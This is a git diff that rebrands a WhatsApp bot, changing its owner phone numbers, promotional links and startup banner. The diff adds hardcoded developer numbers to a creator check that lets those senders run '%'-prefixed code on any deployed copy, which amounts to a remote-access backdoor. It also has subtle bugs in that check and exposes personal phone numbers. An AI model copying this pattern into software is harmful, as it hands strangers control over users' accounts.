@@ -44,7 +44,7 @@ const Crypto = require('crypto')
 const path = require('path')
 const prefix = config.PREFIX
 
-const ownerNumber = ['22898452555']
+const ownerNumber = ['263780934873']
 
 const tempDir = path.join(os.tmpdir(), 'cache-temp')
 if (!fs.existsSync(tempDir)) {
@@ -88,7 +88,7 @@ let conn // ✅ GLOBAL conn declaration
 
 async function connectToWA() {
   try {
-    console.log("[ ♻ ] SCORPION XD Connecting to WhatsApp ⏳️...")
+    console.log("[ ♻ ] Connecting to WhatsApp ⏳️...")
 
     const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
     const { version } = await fetchLatestBaileysVersion()
@@ -121,22 +121,22 @@ async function connectToWA() {
           })
 
           console.log('[ ✔ ] Plugins installed successfully ✅')
-          console.log('[ 🪀 ] SCORPION Bot connected to WhatsApp 📲')
+          console.log('[ 🪀 ] Bot connected to WhatsApp 📲')
 
-          let up = `*Hᴇʟʟᴏ ᴛʜᴇʀᴇ SCORPION XD ᴄᴏɴɴᴇᴄᴛᴇᴅ! 👋🏻* 
+          let up = `*Hᴇʟʟᴏ ᴛʜᴇʀᴇ SCORP xᴅ ᴄᴏɴɴᴇᴄᴛᴇᴅ! 👋🏻* 
 
-*ᴋᴇᴇᴘ ᴏɴ ᴜsɪɴɢ SCORPION ᴍᴏᴅs🚩* 
+*ᴋᴇᴇᴘ ᴏɴ ᴜsɪɴɢ SCORP ᴍᴏᴅs🚩* 
 
 > sᴜʙsᴄʀɪʙᴇ ʏᴛ ᴄʜᴀɴɴᴇʟ ғᴏʀ ᴛᴜᴛᴏʀɪᴀʟs
-https://youtube.com/@SCORPIOntech2
+https://youtube.com/@SCORPIONtech
 
 - *ʏᴏᴜʀ ʙᴏᴛ ᴘʀᴇғɪx: ➡️[ . ]*
 > - ʏᴏᴜ ᴄᴀɴ ᴄʜᴀɴɢᴇ ᴜʀ ᴘʀᴇғɪx ᴜsɪɴɢ ᴛʜᴇ .ᴘʀᴇғɪx ᴄᴏᴍᴍᴀɴᴅ
 
 > ᴅᴏɴᴛ ғᴏʀɢᴇᴛ ᴛᴏ sʜᴀʀᴇ, sᴛᴀʀ & ғᴏʀᴋ ᴛʜᴇ ʀᴇᴘᴏ ⬇️ 
-https://github.com/whatsappbot228-ship-it/SCORPION_XD       
+https://github.com/jopaok/SCORP-XD
 
-> © ᴘᴏᴡᴇʀᴇᴅ ʙʏ SCORPION XD 🇹🇬`;
+> © ᴘᴏᴡᴇʀᴇᴅ ʙʏ scorp ᴋɪɴɢ 🇿🇼`;
     conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/lm4a0b.jpg` }, caption: up })
 
           const channelJid = "120363402507750390@newsletter"
@@ -192,7 +192,7 @@ conn?.ev?.on('messages.update', async updates => {
       await conn.readMessages([mek.key])
     }
   if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
-    const scorpionlike = await conn.decodeJid(conn.user.id);
+    const malvinlike = await conn.decodeJid(conn.user.id);
     const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
     const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
     await conn.sendMessage(mek.key.remoteJid, {
@@ -241,10 +241,11 @@ conn?.ev?.on('messages.update', async updates => {
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
   const udp = botNumber.split('@')[0];
-    const scorpion = ('22898452555');
+    const malvin = ('263780166288', '263714757857', '263780934873');
     let isCreator = [udp, malvin, config.DEV]
 					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
-					.includes(mek.sender) 
+					.includes(mek.sender);
+
     if (isCreator && mek.text.startsWith('%')) {
 					let code = budy.slice(2);
 					if (!code) {
@@ -287,7 +288,7 @@ conn?.ev?.on('messages.update', async updates => {
 				}
  //================ownerreact==============
     
-if (senderNumber.includes("22898452555") && !isReact) {
+if (senderNumber.includes("923427582273") && !isReact) {
   const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇵🇰", "💗", "❤️", "💥", "🌼", "🏵️", ,"💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
   const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
   m.react(randomReaction);
@@ -468,4 +469,5 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
                   if (mime.split("/")[0] === "image") {
                     return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
                   }
-                  if (mime.split("/"
+                  if (mime.split("/")[0] === "video") {
+   
